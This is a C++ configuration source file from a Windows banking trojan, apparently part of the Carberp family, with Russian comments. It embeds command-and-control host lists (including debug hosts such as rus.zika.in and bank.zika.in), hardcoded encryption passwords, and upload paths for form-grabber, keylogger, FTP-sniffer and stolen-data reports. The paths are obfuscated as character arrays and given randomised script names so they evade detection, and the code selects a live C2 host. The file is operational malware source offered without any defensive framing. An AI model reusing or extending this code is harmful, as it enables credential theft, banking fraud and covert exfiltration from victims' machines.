#include <windows.h>
#include <shlobj.h>

#include "Config.h"
#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "Crypt.h"
#include "BotHosts.h"
#include "BotClasses.h"


#include "Modules.h"

//#include "BotDebug.h"

namespace CONFIGDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define CFGDBG CONFIGDEBUGSTRINGS::DBGOutMessage<>




#ifndef DEBUGCONFIG
//=============================================================================
//  Параметры которые должны бать вшиты билдером бота
//=============================================================================


	//****************************************************************************
	//  Массив хостов.
	//  Записывать только имена хостов, без протоколов, путей, разделителей
	//
	//  Каждый хост должен ограничиваться нулевым символом, после последнего хоста
	//  должно стоять два нулевых символа. Не допускаются никакие дополнительные
	//  символы - пробелы, табуляции и т.д
	//
	//  host1.com\0host2.com\0host3.com\0\0
	//****************************************************************************
	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = BOTPARAM_MAINHOSTS;

	//****************************************************************************
	//  Хосты хранения хостов для отправки кабов
	//****************************************************************************
    char BOT_BANKHOSTS_ARRAY[MAX_BANKHOSTS_BUF_SIZE] = BOTPARAM_BANKHOSTS;

	//----------------------------------------------------------------------------
	// Интервал отстука (в минутах). Строковое значение
	//----------------------------------------------------------------------------
	char Delay[MAX_DELAY_SIZE + 1]  = BOTPARAM_DELAY;
	#define DELAY_PARAM_NAME_HASH 0x59906EFB /* DELAY_ */

	//----------------------------------------------------------------------------
	// Префикс бота
	//----------------------------------------------------------------------------
	char BOT_PREFIX[MAX_PREFIX_SIZE + 1] = BOTPARAM_PREFIX;

	//----------------------------------------------------------------------------
	// Основной пароль бота. Весь трафик будет шифроваться этим паролем
	//----------------------------------------------------------------------------
	char MainPassword[MAX_PASSWORD_SIZE + 1] = BOTPARAM_MAINPASSWORD;
	#define MainPasswordNameHash 0x618ADDBE /*MAIN_PASSWORD*/

	//----------------------------------------------------------------------------
	// Имя бот плага.
	// Будет передаватся от LoaderDll в ботплаг.
	// Параметр необходим для выполнения команды обновления плага. 
	// В самом ботплаге нет информации из какого файла его подгрузили.
	//----------------------------------------------------------------------------
	char BotPlugName[MAX_BOT_PLUG_NAME_SIZE] = BOTPARAM_PLUG_NAME;
//=============================================================================
#else

	//  Хосты должны быть с двумя нулями в конце

//	char BOT_HOSTS_ARRAY[MAX_HOSTS_BUF_SIZE]	  = "rus.gipa.in\0";
//	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
//	char DebugBotPrefix[] = "aaaaaaaaa";
//	PCHAR DebugDelay      = "1";


	char BOT_MAINHOSTS_ARRAY[MAX_MAINHOSTS_BUF_SIZE] = "rus.zika.in\0";

	char BOT_BANKHOSTS_ARRAY[] = "bank.zika.in\0";

	PCHAR DebugPassword   = "bRS8yYQ0APq9xfzC";
	char BOT_PREFIX[]     = "BSSTEST";
	PCHAR DebugDelay      = "1";

#endif


//----------------------------------------------------------------------------
// Префикс бота работающего в режиме Банк
//----------------------------------------------------------------------------
char BOT_PREFIX_BANK[] = {'b','a','n','k','i','n','g', 0};



//----------------------------------------------------------------------------
// Стандартный пароль, будет использоваться только в случаях
// когда требуется основной пароль, но он не указан
//----------------------------------------------------------------------------
const char DefaultPassword[] = {'K', '8', 'D', 'F', 'a', 'G', 'Y', 'U', 's', '8', '3', 'K', 'F', '0', '5', 'T',  0};;



// Адреса скриптов
#ifndef CryptHTTPH
	const static char PathTask[]        = {'/','s','e','t','/','t','a','s','k','.','h','t','m','l', 0};
	const static char PathFirstInfo[]   = {'/','s','e','t','/','f','i','r','s','t','.','h','t','m','l',0};
	const static char PathFormGrabber[] = {'/','g','e','t','/','f','g','r','.','h','t','m','l',0};
	const static char PathFTPSniffer[]  = {'/','g','e','t','/','s','n','i','.','h','t','m','l',0};
	const static char PathGrabber[]     = {'/','g','e','t','/','g','r','a','.','h','t','m','l',0};
	const static char PathComment[]     = {'/', 's', 'e', 't', '/', 'c', 'o', 'm', 'm', 'e', 'n', 't', '.', 'h', 't', 'm', 'l',  0};
	const static char PathPluginsList[] = {'/', 's', 'e', 't', '/', 'c', 'f', 'g', 's', '.', 'h', 't', 'm', 'l',  0};
	const static char PathKeylogger[]   = {'/', 'g', 'e', 't', '/', 'k', 'e', 'y', '.', 'h', 't', 'm', 'l',  0};
    const static char PathCab[]         = {'/','g','e','t','/','c','a','b','.','h','t','m','l' ,0};
	const static char PathPlugins[]     = {'/','s','e','t','/','p','l','u','g','s','.','h','t','m','l',0};

	#ifdef HunterH
		const static char PathHunter[]  = {'/','s','e','t','/','h','u','n','t','e','r','.','h','t','m','l',0};
	#endif
#endif

const static char PathConfig[]      = {'/','c','f','g','/',0};
const static char PathRemoteLog[]   = {'/','p','a','t','/','s','c','r','l','.','h','t','m','l', 0};


// Расширения доступные для папки SET
const static PCHAR SETFolderExts[] = {".phtml", ".php3", ".phtm", ".inc", ".7z"};

// Расширения доступные для папки GET
const static PCHAR GETFolderExts[] = {".cgi", ".pl", ".doc", ".rtf", ".tpl", ".rar"};


const static char HTTPProtocol[] = "http://";


//------------------------------------------------------------------
//  GetBotHosts - Функция возвращает указатель на массив хостов бота
//------------------------------------------------------------------
PCHAR GetBotHosts()
{
	return BOT_MAINHOSTS_ARRAY;
}
//----------------------------------------------------------------------------


string GetBankingModeFileName()
{
	// Функция возвращает имя сигнального файла
	// для банковского префикса

	string Path(MAX_PATH);
	if (!SHGetSpecialFolderPathA(NULL, Path.t_str(), CSIDL_APPDATA, TRUE))
		return NULLSTR;
    Path.CalcLength();

    Path += "\\";
	Path += BANKING_SIGNAL_FILE;

	return Path;
}
//-----------------------------------------------------------------------------

void SetBankingMode(bool IsBanking)
{
	string FileName = GetBankingModeFileName();
	if (!FileName.IsEmpty())
	{
		if (IsBanking)
			File::WriteBufferA(FileName.t_str(), FileName.t_str(), 3);
		else
			pDeleteFileA(FileName.t_str());
		GenerateUid(BOT_UID);
	}
}
//-----------------------------------------------------------------------------

bool IsBankingMode()
{
	// Функция возвращает истину если включен режим "Банк"
	// В этом режиме настройки бота могут отличаться от обычных

	string FileName = GetBankingModeFileName();
	return !FileName.IsEmpty() && FileExistsA(FileName.t_str());
}

//-----------------------------------------------------------------------------


char *GetPrefix(bool CheckBankingMode)
{
	// Функция возвращает префикс бота

		// Проверяем режим режим работы

	if (CheckBankingMode && IsBankingMode())
		return BOT_PREFIX_BANK;

	if (BOTPARAM_ENCRYPTED_PREFIX)
		return Decrypt(BOT_PREFIX);
	else
		return BOT_PREFIX;

}


//-----------------------------------------------------------------------------
#ifdef CryptHTTPH
	PCHAR GetScriptByID(DWORD ID, bool &Created)
	{
		// Функция возвращает адреса скриптов в версии бота, которая
		// поддерживает шифрование и защиту алресов
		Created = false;
		DWORD Min1, Max1, Min2, Max2;
        bool IsGetScript = false;

		#define RANGE(IsGet, Mn1, Mx1, Mn2, Mx2) {Min1 = Mn1; Max1 = Mx1; \
												  Min2 = Mn2; Max2 = Mx2; \
												  IsGetScript = IsGet; \
												  break;}

        // Определяем границы скрипта
		switch (ID) {
			// Скрипты из папки GET
			case SCRIPT_FORM_GRABBER: RANGE(true, 1, 3, 24, 26);
			case SCRIPT_GRABBER:      RANGE(true, 4, 6, 27, 30);
			case SCRIPT_FTP_SNIFFER:  RANGE(true, 7, 9, 31, 33);
			case SCRIPT_CAB:          RANGE(true, 10, 12, 34, 36);
//            case SCRIPT_CAB_PART:     RANGE(true, 13, 15, 37, 39);
			case SCRIPT_KEYLOGGER:    RANGE(true, 16, 18, 40, 42);
//			case SCRIPT_SCREENSHOT:   RANGE(true, 22, 24, 46, 48);

			// Скрипты из папки SET
			case SCRIPT_TASK:         RANGE(false, 1, 6, 18, 24);
			case SCRIPT_FIRST_INFO:   RANGE(false, 7, 12, 25, 30);
			case SCRIPT_PLUGINS:      RANGE(false, 13, 17, 31, 36);
			case SCRIPT_COMMENT:      RANGE(false, 37, 48, 37, 48);
			case SCRIPT_HUNTER:       RANGE(false, 49, 56, 48, 56);
			case SCRIPT_PLUGINS_LIST: RANGE(false, 57, 64, 57, 64);
			case SCRIPT_REMOTE_LOG:   return (PCHAR)PathRemoteLog;
		default:
			return NULL;
		}


		// Генерируем путь
        Created = true;
		DWORD ExtCount = 0;
		if (IsGetScript)
			ExtCount = sizeof(GETFolderExts) / sizeof(PCHAR);
		else
			ExtCount = sizeof(SETFolderExts) / sizeof(PCHAR);

		PCHAR *Exts = NULL;
		if (IsGetScript)
			Exts = (PCHAR*)&GETFolderExts[0];
		else
			Exts = (PCHAR*)&SETFolderExts[0];

		return GenerateRandomScript(Min1, Max1, Min2, Max2, ExtCount, Exts);

	}
//-----------------------------------------------------------------------------

#else

	PCHAR GetScriptByID(DWORD ID, bool &Created)
	{
		// Функция возвращает адреса скриптов в версии бота, которая не
		// поддерживает шифрование
		Created = false;
		switch (ID)
		{
			case SCRIPT_FORM_GRABBER: return (PCHAR)PathGrabber;
			case SCRIPT_TASK:         return (PCHAR)PathTask;
			case SCRIPT_FIRST_INFO:   return (PCHAR)PathFirstInfo;
			case SCRIPT_PLUGINS:      return (PCHAR)PathPlugins;
			case SCRIPT_FTP_SNIFFER:  return (PCHAR)PathFTPSniffer;
			case SCRIPT_GRABBER:      return (PCHAR)PathGrabber;

			#ifdef HunterH
			case SCRIPT_HUNTER: return (PCHAR)PathHunter;
			#endif

			case SCRIPT_COMMENT:      return (PCHAR)PathComment;
			case SCRIPT_PLUGINS_LIST: return (PCHAR)PathPluginsList;
			case SCRIPT_KEYLOGGER:    return (PCHAR)PathKeylogger;
			case SCRIPT_CAB:          return (PCHAR)PathCab;
			case SCRIPT_REMOTE_LOG:   return (PCHAR)PathRemoteLog;
		}
		return NULL;

	}

#endif
//-----------------------------------------------------------------------------


int GetDelay()
{
	PCHAR Str = NULL;
	#ifdef DEBUGCONFIG
		Str = DebugDelay;
	#else
		if (CalcHash(Delay) != DELAY_PARAM_NAME_HASH)
			Str = Delay;
	#endif

	int V = 0;
	if (Str != NULL)
		V = m_atoi(Str);

	if (V == 0)
		V = DEFAULT_DELAY;

	return V;
}

#ifdef DEBUGCONFIG
	// В отладочном режиме предоставляем возможность установить отладочный хост
	void SetDebugHost(PCHAR Host)
	{
		
		if (!StrCopy(BOT_MAINHOSTS_ARRAY, Host))
        	StrCopy(BOT_MAINHOSTS_ARRAY, "localhost");
	}
#endif


//-----------------------------------------------------------------------------
PCHAR GetActiveHost()
{
	// Функция возвращает активный (доступный) хост

	CFGDBG("Cofig", "Получаем активный хост.");

	#ifndef DEBUGCONFIG
		PCHAR Result  = NULL;

		// Первым этапом пытаемся получить хост из файла
		if (Hosts::GetActiveHostFormFile(NULL, Result))
		{
			CFGDBG("Cofig", "Получили хост из файла");
			return Result;
		}
	#endif

	return GetActiveHostFromBuf(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS);

}
//-----------------------------------------------------------------------------

string GetActiveHost2()
{
	// Функция возвращает активный (доступный) хост
	#ifndef DEBUGCONFIG
		PCHAR Host  = NULL;

		// Первым этапом пытаемся получить хост из файла
		if (Hosts::GetActiveHostFormFile(NULL, Host))
		{
			CFGDBG("Cofig", "Получили хост из файла");
			string Result(Host);
			STR::Free(Host);
			return Result;
		}
	#endif
	return GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY, BOTPARAM_HASH_MAINHOSTS, BOTPARAM_ENCRYPTED_MAINHOSTS);
}
//-----------------------------------------------------------------------------


PCHAR GetActiveHostFromBuf(PCHAR Hosts, DWORD EmptyArrayHash)
{
	//  Функция возвращает хост из буфера
	if (STR::IsEmpty(Hosts))
    	return NULL;

	if (EmptyArrayHash != 0 && CalcHash(Hosts) == EmptyArrayHash)
	{
		// Хосты не вшиты
		return NULL;
	}

	PCHAR Host = Hosts;

	while (*Host != 0)
	{
		// декриптуем хост и проверяем его
		PCHAR Result = STR::New(Host);

		if (BOTPARAM_ENCRYPTED_MAINHOSTS)
			Decrypt(Host, Result);

		if (Hosts::CheckHost(Result))
			return Result;

		STR::Free(Result);

		// переходим на другой элемент
		Host = STR::End(Host);
		Host++;
	}

	return NULL;
}


string GetActiveHostFromBuf2(const char* Hosts, DWORD EmptyArrayHash, bool Encrypted)
{
	//  Функция возвращает хост из буфера
	string Result;
	if (AnsiStr::IsEmpty(Hosts))
    	return Result;

	if (EmptyArrayHash != 0 && AnsiStr::Hash(Hosts) == EmptyArrayHash)
	{
		// Хосты не вшиты
		return Result;
	}

	PCHAR Host = (PCHAR)Hosts;

	while (*Host != 0)
	{
		// декриптуем хост и проверяем его
        string Tmp = Host;
		// Расшифровываем данные
		if (Encrypted)
			Decrypt(Host, Tmp.t_str());

		if (Hosts::CheckHost(Tmp.t_str()))
			return Tmp;

		// переходим на другой элемент
		Host = STR::End(Host);
		Host++;
	}

	return Result;
}

//-----------------------------------------------------------------------------

PCHAR GetBotScriptURL(DWORD Script, PCHAR Path)
{
	// Функция возвращает полный адрес скрипта
	bool PathCreated = false;

	CFGDBG("Cofig", "Получаем адрес скрипта %d", Script);

	if (STR::IsEmpty(Path))
		Path = GetScriptByID(Script, PathCreated);

	CFGDBG("Cofig", "Путь скрипта %s", Path);



	PCHAR Host = GetActiveHost();

	PCHAR Result = NULL;

	if (Host != NULL)
	{
		PCHAR Slash = NULL;
		if (Path == NULL || *Path != '/')
        	Slash = "/";

		Result = STR::New(4, (PCHAR)HTTPProtocol, Host, Slash, Path);

		STR::Free(Host);
		CFGDBG("Cofig", "Адрес скрипта: %s", Result);
	}
	else
	{
		#ifndef DEBUGCONFIG
			CFGDBG("Cofig", "Не удалось получить хост. Содержимое массива: \r\n%s", BOT_MAINHOSTS_ARRAY);
		#endif
	}

	if (PathCreated)
		STR::Free(Path);

	return Result;
}
//----------------------------------------------------------------------------


//-----------------------------------------------------
//  GetBankingScriptURL-  Функция возвращает адрес
//		скрипта с проверкой включенного режима Banking
//-----------------------------------------------------
string GetBankingScriptURL(DWORD Script, bool CheckBankingMode)
{
	string Host;
	if (CheckBankingMode && IsBankingMode())
	{
		Host = GetActiveHostFromBuf2(BOT_BANKHOSTS_ARRAY,
									 BOTPARAM_HASH_BANKHOSTS,
									 BOTPARAM_ENCRYPTED_BANKHOSTS);
	}
	else
	{
		Host = GetActiveHostFromBuf2(BOT_MAINHOSTS_ARRAY,
									 BOTPARAM_HASH_MAINHOSTS,
									 BOTPARAM_ENCRYPTED_MAINHOSTS);
    }

	string URL;
	if (!Host.IsEmpty())
	{
		bool PathCreated = false;
		PCHAR Path = GetScriptByID(Script, PathCreated);

		URL = HTTPProtocol;
		URL += Host;
		URL += Path;

		if (PathCreated)
            STR::Free(Path);
	}
	return URL;
}
//----------------------------------------------------------------------------


// Функция возвращает пароль для криптования принимаемых/отправляемых данных

PCHAR GetMainPassword(bool NotNULL)
{
	// Функция возвращает пароль шифрования
	PCHAR Passw = NULL;
	#ifdef DEBUGCONFIG
		Passw = STR::New(DebugPassword);
	#else
		// Проверяем задан ли в боте пароль
		if (CalcHash(MainPassword) != MainPasswordNameHash)
		{
			Passw = STR::Alloc(StrCalcLength(MainPassword));
			Decrypt(MainPassword, Passw);
		}
	#endif

	// В случае необходимости возвращаем cтандартный пароль
	if (NotNULL && STR::IsEmpty(Passw))
	{
    	Passw = STR::New((PCHAR)DefaultPassword);
    }


	return Passw;
}
//----------------------------------------------------------------------------

PCHAR GenerateRandomScript(DWORD Min1, DWORD Max1, DWORD Min2, DWORD Max2, DWORD ExtsCount, PCHAR *Exts)
{
	// Функция генерирует случайное имя скрипта
	DWORD Sz = 0;
	if (Random::Generate(0, 1000) < 500)
		Sz = Random::Generate(Min1, Max1);
	else
		Sz = Random::Generate(Min2, Max2);

	PCHAR Name = Random::RandomString(Sz, 'a', 'z');

	// Добавляем расширение скрипта

	DWORD ExtPos = Random::Generate(1, ExtsCount);
	for (DWORD i = 1; i < ExtPos; i++, Exts++);
	PCHAR Ext = *Exts;

	PCHAR Script = STR::New(3, "/", Name, Ext);

	STR::Free(Name);

    return Script;
}
//----------------------------------------------------------------------------

DWORD WINAPI GetBotParameter(DWORD ParamID, PCHAR Buffer, DWORD BufSize)
{
	//  Функция возвращает парметр бота
	if (Buffer != NULL && BufSize == 0)
		return 0;

	PCHAR Value = NULL;

	#ifdef DEBUGCONFIG
		switch (ParamID) {
			case BOT_PARAM_PREFIX: Value = BOT_PREFIX;  break;
			case BOT_PARAM_HOSTS:  Value = BOT_MAINHOSTS_ARRAY; break;
			case BOT_PARAM_KEY:    Value = DebugPassword; break;
			case BOT_PARAM_DELAY:  Value = DebugDelay; break;
		default: return 0;;
		}
	#else
		switch (ParamID) {
			case BOT_PARAM_PREFIX: Value = BOT_PREFIX;  break;
			case BOT_PARAM_HOSTS:  Value = BOT_MAINHOSTS_ARRAY; break;
			case BOT_PARAM_KEY:    Value = MainPassword; break;
			case BOT_PARAM_DELAY:  Value = Delay; break;
			case BOT_PARAM_BOTPLUGNAME: Value = BotPlugName; break;
		default: return 0;;
		}
	#endif

	if (Value == NULL)
		return 0;

	// Лпределяем размер параметра
	DWORD Size = 0;

	if (ParamID == BOT_PARAM_HOSTS)
	{
		#ifdef DEBUGCONFIG
			 Size = StrCalcLength(Value) + 2;
		#else
			 Size = STR::CalcDoubleZeroStrLength(Value);
		#endif
	}
	else
		Size = StrCalcLength(Value);


	if (Buffer == NULL)
		return Size;


	// Копируем значение
	m_memset(Buffer, 0, BufSize);

	if (BufSize < Size)
	{
		if (ParamID == BOT_PARAM_HOSTS)
            Size = BufSize - 2;
		else
			Size = BufSize - 1;
    }

	DWORD ToCopy = Size;


	#ifdef DEBUGCONFIG
		if (ParamID == BOT_PARAM_HOSTS)
			ToCopy -= 2;
	#endif

    m_memcpy(Buffer, Value, ToCopy);


	#ifdef DEBUGCONFIG
		// Шифруем открытые данные
		if (ParamID == BOT_PARAM_HOSTS ||
			ParamID == BOT_PARAM_PREFIX ||
			ParamID == BOT_PARAM_KEY)
		{
			Decrypt(Buffer, Buffer);
		}
	#endif


	return Size;
}
//----------------------------------------------------------------------------

BOOL WINAPI SetBotParameter(DWORD ParamID, PCHAR Param)
{
	#ifdef DEBUGCONFIG
		return FALSE;
	#else
		if (STR::IsEmpty(Param))
			return FALSE;

		DWORD Size = 0;    // Размер  устанавливаемого параметра
		LPVOID Buf = NULL; // Приёмный буфер
		DWORD Max = 0;     // Максимально допустимый размер

		if (ParamID != BOT_PARAM_HOSTS)
            Size = StrCalcLength(Param);

		// Определяем приёмный буфер и размер параметра

		switch (ParamID) {

			// Устанавливается префикс бота
			case BOT_PARAM_PREFIX:
				{
					Buf = BOT_PREFIX;
					Max = MAX_PREFIX_SIZE;
					break;
				}

			// Устанавливаем хосты
			case BOT_PARAM_HOSTS:
				{
                    Size = STR::CalcDoubleZeroStrLength(Param);
					Buf = BOT_MAINHOSTS_ARRAY;
					Max = MAX_MAINHOSTS_BUF_SIZE;
					break;
				}

			// Устанавливаем ключ шифрования
			case BOT_PARAM_KEY:
				{
					Buf = MainPassword;
					Max = MAX_PASSWORD_SIZE;
					break;
				}

			// Устанавливаем задержку
			case BOT_PARAM_DELAY:
				{
					Buf = Delay;
					Max = MAX_DELAY_SIZE;
					break;
				}

			// Устанавливаем имя плага
			case BOT_PARAM_BOTPLUGNAME:
				{
					Buf = BotPlugName;
					Max = MAX_BOT_PLUG_NAME_SIZE;
					break;
				}

		default: return FALSE;;
		}


		// Устанавливаем параметр
		if (Size == 0 || Buf == NULL || (Max != 0 && Size > Max))
			return FALSE;

        m_memset(Buf, 0, Max);
        m_memcpy(Buf, Param, Size);
        return TRUE;
	#endif
}
//----------------------------------------------------------------------------
